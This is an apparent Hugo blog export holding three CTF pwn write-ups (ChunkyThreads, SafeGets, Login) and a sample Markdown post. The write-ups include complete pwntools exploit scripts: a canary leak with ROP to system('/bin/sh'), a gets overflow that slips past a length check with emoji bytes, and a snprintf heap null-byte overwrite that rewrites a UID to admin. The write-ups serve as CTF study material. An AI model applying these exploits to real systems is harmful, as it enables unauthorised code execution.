[{"content":"ChunkyThreads â€“ l3akCTF 2025\rOverview\rThis binary has no pie but all other protections. it uses different threads to print out data , first we have to set the max number of threads by CHUNKS \u0026lt;num\u0026gt; threads can be upto 10. then we can enter a cmd like CHUNK \u0026lt;sleep_time\u0026gt; \u0026lt;repeat\u0026gt; \u0026lt;data\u0026gt; which uses a thread to print out data and then wait for sleep_time and print again till the data is printed times. The data is stored in a buffer on stack and can be of any length.\nReversed code\rmain main main exploitation plan\rAs the binary first puts and then goes to sleep , we can use a thread to leak stack canary by overwriting till the canary\u0026rsquo;s null byte and then puts will leak it and we also provide a big sleep value so that the thread doesn\u0026rsquo;t execute stach_chk_fail.\n1 2 3 4 5 6 payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x49 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) canary=b\u0026#39;\\x00\u0026#39;+p.recv(7) canary=u64(canary.ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#39;Canary : {hex(canary)}\u0026#39;) Then we use other thread to rop , but the binary had no pop rdi gadget , so we had to rop from libc but for that we had to get libcbase. I was stuck here but then i just examined in gdb where the print function was returning to , i thought it would return in the binary but it was returning to a libc address. I didn\u0026rsquo;t try to find the reason but maybe cuz threads came into play??? So then i leaked this like the same way i leaked the canary and then calculated the offset of this leaked libc address from the libcbase and hardcoded this offset as it will not change. At last we just call system(/bin/sh) and put the sleep time less as we want this to exit before the other 2 threads execute stack_chk_fails\nFull exploit script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * binary=\u0026#39;./chall_patched\u0026#39; elf = context.binary = ELF(binary, checksec=False) #context.log_level=\u0026#39;debug\u0026#39; libc=ELF(\u0026#39;./libc.so.6\u0026#39;,checksec=False) #p=process(binary) #gdb.attach(p) p=remote(\u0026#34;34.45.81.67\u0026#34;,16006) p.clean() p.send(b\u0026#39;CHUNKS 8 \u0026#39;) # setting max threads value p.recvline() p.clean() payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x49 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) canary=b\u0026#39;\\x00\u0026#39;+p.recv(7) canary=u64(canary.ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#39;Canary : {hex(canary)}\u0026#39;) payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*88 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) libcaddr=p.recv(6) libcbase=u64(libcaddr.ljust(8,b\u0026#39;\\x00\u0026#39;))-0x9caa4 log.critical(f\u0026#39;Libcaddr : {hex(libcbase+0x9caa4)}\u0026#39;) log.critical(f\u0026#39;Libcbase : {hex(libcbase)}\u0026#39;) libc.address=libcbase poprdi=libcbase+0x000000000010f75b binsh=libcbase+0x1cb42f system=libcbase+0x58750 log.critical(f\u0026#39;poprdi : {hex(poprdi)}\u0026#39;) log.critical(f\u0026#39;binsh : {hex(binsh)}\u0026#39;) log.critical(f\u0026#39;system : {hex(system)}\u0026#39;) p.clean() payload=b\u0026#39;CHUNK 1 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x48 + p64(canary) +b\u0026#39;B\u0026#39;*8 + p64(poprdi) + p64(binsh) +p64(0x000000000040101a) +p64(system) p.send(payload) p.interactive() Result\r","date":"2025-07-12T00:00:00Z","permalink":"http://localhost:1313/blog/post/l3ak-2025-chunkythreads/","title":"L3AKCTF 2025 - ChunkyThreads"},{"content":"SafeGets â€“ l3akCTF 2025\rOverview\rThe original binary was rather simple using gets() to read data into buffer and then printing the reversed string of buffer via puts , it had a win function too. it had no canary , no pie , nx on . so it was clear what we needed to do . but there was a wrapper.py which was first checking if our input is less than 255 bytes and then only executing the binary with out input.\nCode \u0026amp; wrapper.py\rwrapper.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import subprocess import sys BINARY = \u0026#34;./chall\u0026#34; MAX_LEN = 0xff # Get input from user payload = input(f\u0026#34;Enter your input (max {MAX_LEN} bytes): \u0026#34;) if len(payload) \u0026gt; MAX_LEN: print(\u0026#34;[-] Input too long!\u0026#34;) sys.exit(1) # Start the binary with pipes proc = subprocess.Popen( [BINARY], stdin=subprocess.PIPE, stdout=sys.stdout, stderr=subprocess.PIPE ) code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 undefined8 main(void) { size_t sVar1; char buffer [259]; char local_15; int local_14; ulong i; gets(buffer); sVar1 = strlen(buffer); local_14 = (int)sVar1; for (i = 0; i \u0026lt; (ulong)(long)(local_14 / 2); i = i + 1) { local_15 = buffer[(long)(local_14 + -1) - i]; buffer[(long)(local_14 + -1) - i] = buffer[i]; buffer[i] = local_15; } puts(\u0026#34;Reversed string:\u0026#34;); puts(buffer); return 0; } exploitation plan\rIf we don\u0026rsquo;t consider wrapper.py then it was just buffer overflow and overwriting the return address to the win function. And also to bypass the reversing of our payload we can just add a null byte in front of our payload as strlen just checks the input till null byte and with this the reversing will not happen as it will think the len is 0 , and this input is also read with read() so it will continue to read even if it encounters a null byte. But the offset to the return address was more than 255 bytes , so wee somehow had to bypass wrapper.py\nso after a bit of searching i found out python\u0026rsquo;s len treats emojis, Chinese characters etc which are in utf-8 encoding as 1 but in actual bytes they can reach many bytes.\nso i just had to use a emoji as a garbage value to fill up the stack instead of normal characters , that would bypass the len check\nexploit script\r1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * binary=\u0026#39;./chall\u0026#39; elf = context.binary = ELF(binary, checksec=False) #p=process(binary) p=remote(\u0026#34;34.45.81.67\u0026#34;,16002) p.recvuntil(b\u0026#39;t (max 255 bytes):\u0026#39;) #gdb.attach(p) payload=b\u0026#39;\\x00\u0026#39;+(\u0026#34;ðŸ’€\u0026#34;*69).encode(\u0026#34;utf-8\u0026#34;) +b\u0026#39;AAA\u0026#39;+p64(0x40101a)+p64(0x401262) p.sendline(payload) p.interactive() Result\r","date":"2025-07-12T00:00:00Z","permalink":"http://localhost:1313/blog/post/l3ak-2025-safegets/","title":"L3AKCTF 2025 - SafeGets"},{"content":"Challenge: login â€“ MaltaCTF 2025\rThis was a heap challenge with a subtle bug in a snprintf() call that allows a heap-based null byte overwrite, giving us a path to become the admin and read the flag.\nOverview\rThe binary simulates a simple multi-user system with features to:\nCreate and delete users View and select a current user Log in as the admin user to get the flag Only the user with UID 0 (i.e. the admin) can access the flag.\nSource Code\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define NAME_LEN 0x24 #define BIO_LEN 0x30 #define USER_COUNT 0x10 #define ADMIN_UID 0 #define USER_UID 1 typedef struct user { unsigned int uid; char name[NAME_LEN]; char bio[BIO_LEN]; } user_t; unsigned int curr_uid = 1000; user_t admin; user_t* users[USER_COUNT]; unsigned int current_user; int getint(const char* msg) { printf(msg); char buf[0x8] = {}; int choice = -1; read(0, buf, sizeof(buf)); return atoi(buf); } int menu() { printf(\u0026#34;1) Create user\\n\u0026#34;); printf(\u0026#34;2) Select user\\n\u0026#34;); printf(\u0026#34;3) Print users\\n\u0026#34;); printf(\u0026#34;4) Delete user\\n\u0026#34;); printf(\u0026#34;4) Login\\n\u0026#34;); printf(\u0026#34;5) Exit\\n\u0026#34;); return getint(\u0026#34;\u0026gt; \u0026#34;); } int create() { int idx = -1; int ret = -1; char namebuf[NAME_LEN] = {}; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } users[idx] = calloc(1, sizeof(user_t)); users[idx]-\u0026gt;uid = curr_uid++; printf(\u0026#34;Enter user name.\\n\u0026gt; \u0026#34;); ret = read(0, users[idx]-\u0026gt;name, NAME_LEN - 1); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to read user name!\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;name[ret-1] = \u0026#39;\\0\u0026#39;; ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to create user bio\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;bio[ret-1] = \u0026#39;\\0\u0026#39;; return 0; } int select_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } current_user = idx; return 0; } int delete_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } free(users[idx]); users[idx] = NULL; return 0; } void print_users() { for (int i = 0; i \u0026lt; USER_COUNT; i++) { if (!users[i]) continue; printf(\u0026#34;User %d\\n\u0026#34;, i); printf(\u0026#34;UID : %u\\n\u0026#34;, users[i]-\u0026gt;uid); printf(\u0026#34;Name: %s\\n\u0026#34;, users[i]-\u0026gt;name); printf(\u0026#34;Bio : %s\\n\\n\u0026#34;, users[i]-\u0026gt;bio); } } int login() { if (users[current_user] \u0026amp;\u0026amp; users[current_user]-\u0026gt;uid == ADMIN_UID) { int fd = open(\u0026#34;flag.txt\u0026#34;, O_RDONLY); char buf[0x100] = {}; if (fd \u0026lt; 0) { printf(\u0026#34;Flag file does not exist.. if this is on remote, contact an admin.\\n\u0026#34;); return -1; } read(fd, buf, 0x100); printf(\u0026#34;Hi admin, here is your flag: %s\\n\u0026#34;, buf); return 0; } else { printf(\u0026#34;You don\u0026#39;t have permission to do that....\\n\u0026#34;); return -1; } } void setup() { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr, 0, 2, 0); } int main(void) { setup(); admin.uid = 0; strcpy(admin.name, \u0026#34;admin\u0026#34;); while (1) { int choice = menu(); switch (choice) { case 1: if (create() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 2: if (select_user() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 3: print_users(); break; case 4: if (delete_user() \u0026lt; 0) { printf(\u0026#34;Failed to delete user!\\n\u0026#34;); } break; case 5: if (login() \u0026lt; 0) { printf(\u0026#34;Failed to login!\\n\u0026#34;); } break; case 6: return 0; break; default: printf(\u0026#34;Invalid choice.\\n\u0026#34;); break; } } } Vulnerability\rThe vulnerability lies in this part of the create() function:\n1 2 ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); users[idx]-\u0026gt;bio[ret - 1] = \u0026#39;\\0\u0026#39;; Hereâ€™s whatâ€™s wrong:\nsnprintf() returns the total number of characters it would have written, even if the output is truncated. If the name input is long, ret will be larger than BIO_LEN, and bio[ret - 1] = '\\0' will write a null byte out of bounds into the next chunkâ€™s memory. That gives us a heap-based null byte overflow primitive.\nExploitation Plan\rWe want to Exploit the overflow to null out part of a neighboring userâ€™s uid.\nBut we face a challenge: the name field can only hold 34 bytes (actually 35 bytes but the last byte is null byte and when we pass it into the %s for blog text it takes only the bytes before the null byte)\nThe suffix \u0026quot; is a really cool hacker\\n\u0026quot; is 25 bytes. That means ret=snprintf() maxes out at 34 + 25 = 59 =\u0026gt; ret-1=58 â€” so we can only overwrite at a maximum offset 58 from the start of bio.\nLetâ€™s understand memory layout:\n1 2 user_t (from calloc) =\u0026gt; 0x60 bytes chunk [ uid 4 bytes | name 36 bytes | bio 48 bytes ] If two user_t chunks are next to each other:\n1 2 Chunk 1: [prev-size][size][uid][name][bio] Chunk 2: [prev-size][size][uid][name][bio] But as prev-size field of next chunk is usable memory for the chunk before it so we have the structure like\n1 [prev-chunk bio][next-chunk size][next-chunk uid] At start uid=1000=0x3E8\n1 2 E8 03 00 00 bio[59] bio[58] bio[57] bio[56] so we can only overwrite this 3rd nibble 03 , so this doesnt solve our problem. One thing we can do is if we create more users till our target uid=0x400=1024 , 00 04 00 00 then we can achieve uid=0 by overwriting the 3rd nibble only\nSo if we can:\nArrange two adjacent chunks, Overflow bio[58], And ensure the target UID is 0x00000400 (00 04 00 00), Then overwriting bio[58]= 0x00 makes it â†’ 00 00 00 00 (UID 0 = admin) Heap Feng Shui\rAs calloc doesnt allocate chunks from tcache , we first have to fill tcache so that the next freed entry goes to fastbin and then we can achieve ptr reuse by using the chunk from fastbin To place chunks adjacently, we:\nFill the tcache bin for size 0x60 (7 entries). Force freed chunks to go into fastbin. Use Use-After-Free (UAF) behavior to allocate a chunk adjacent to another. Exploit Script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * p = remote(\u0026#34;login.shared.challs.mt\u0026#34;, 1337) uid = 999 def adduser(index, name): global uid p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) # Create user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.send(name) uid += 1 print(f\u0026#34;[+] Added user {uid}\u0026#34;) def deleteuser(index): p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) # Delete user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) # Fill tcache bin for i in range(7): adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Push UID counter up to 1024 (0x400) while uid \u0026lt;= 1021: adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Create user with uid=1024 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;) # This should be UID=1023 adduser(b\u0026#39;1\u0026#39;, b\u0026#39;BBBBBBBBB\u0026#39;) # This should be UID=1024 deleteuser(b\u0026#39;0\u0026#39;) # Free the first # Trigger the overflow â€” overwrite byte at bio[58] to null out UID=1024 â†’ UID=0 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;*34) # Now user at index 1 should be UID=0 (admin), so select and login p.sendline(b\u0026#39;2\u0026#39;) # Select user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.sendline(b\u0026#39;5\u0026#39;) # Login p.interactive() Result\r","date":"2025-06-22T00:00:00Z","permalink":"http://localhost:1313/blog/post/malta-2025-login/","title":"MaltaCTF 2025 - Login"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings\rThe following HTML \u0026lt;h1\u0026gt;â€”\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1\rH2\rH3\rH4\rH5\rH6\rParagraph\rXerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes\rThe blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution\rTiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution\rDon\u0026rsquo;t communicate by sharing memory, share memory by communicating. â€” Rob Pike1\nTables\rTables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables\rItalics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks\rCode block with backticks\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces\r\u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block with Hugo\u0026rsquo;s internal highlight shortcode\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block\r1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types\rOrdered List\rFirst item Second item Third item Unordered List\rList item Another item And another item Nested list\rFruit Apple Orange Banana Dairy Milk Cheese Other Elements â€” abbr, sub, sup, kbd, mark\rGIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image\rThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2025-06-21T00:00:00Z","image":"http://localhost:1313/blog/post/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu_e95a4276bf860a84.jpg","permalink":"http://localhost:1313/blog/post/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]